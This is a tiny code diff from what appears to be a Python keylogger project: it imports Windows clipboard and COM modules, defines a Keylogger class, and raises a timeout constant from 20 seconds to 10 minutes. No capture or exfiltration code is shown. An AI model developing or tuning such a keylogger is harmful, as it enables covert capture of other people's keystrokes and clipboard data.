@@ -11,7 +11,7 @@ import pythoncom
 import win32clipboard
 
 # 设置超时时间，单位为秒
-TIMEOUT = 20 * 1
+TIMEOUT = 60 * 10
 
 
 class Keylogger:
